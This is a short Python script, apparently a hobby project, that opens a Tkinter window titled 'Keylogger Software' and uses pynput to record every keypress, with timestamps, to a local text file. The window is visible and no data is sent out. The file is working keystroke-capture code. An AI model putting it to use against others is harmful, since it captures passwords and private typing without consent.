from tkinter import *
from tkinter import ttk
from PIL import Image, ImageTk

import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"D:\keylogger"
logging.basicConfig(filename=(log_dir + r"/keylog.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    logging.info(str(key))

class Keylogger_software:
    def __init__(self, root):
        self.root = root
        self.root.geometry("1250x790+0+0")
        self.root.title("Keylogger Software")

        # Background image
        img3 = Image.open(r"C:\Users\kanis\OneDrive\Desktop\face-recognize\images\keylogger1.jpeg")
        img3 = img3.resize((1540, 900), Image.ANTIALIAS)
        self.picture3 = ImageTk.PhotoImage(img3)

        bg_img = Label(self.root, image=self.picture3)
        bg_img.place(x=0, y=0, width=1540, height=900)

        title_lbl = Label(bg_img, text="KEYLOGGER IS LISTENING", font=("pangolin", 35, "bold"), bg="gray", fg="black")
        title_lbl.place(x=0, y=0, width=1530, height=50)

        # Keylogger button
        img4 = Image.open(r"C:\Users\kanis\OneDrive\Desktop\face-recognize\images\keylogger2.jpeg")
        img4 = img4.resize((160, 160), Image.ANTIALIAS)
        self.picture4 = ImageTk.PhotoImage(img4)

        b1 = Button(bg_img, image=self.picture4, cursor="hand2")
        b1.place(x=680, y=100, width=160, height=160)

        b2 = Button(bg_img, text="KEYLOGGER!!", cursor="hand2", font=("pangolin", 13, "bold"), bg="gray", fg="blue")
        b2.place(x=680, y=250, width=160, height=40)

if __name__ == "__main__":
    root = Tk()
    obj = Keylogger_software(root)

    # Start the keylogger
    with Listener(on_press=on_press) as listener:
        root.mainloop()
        listener.join()
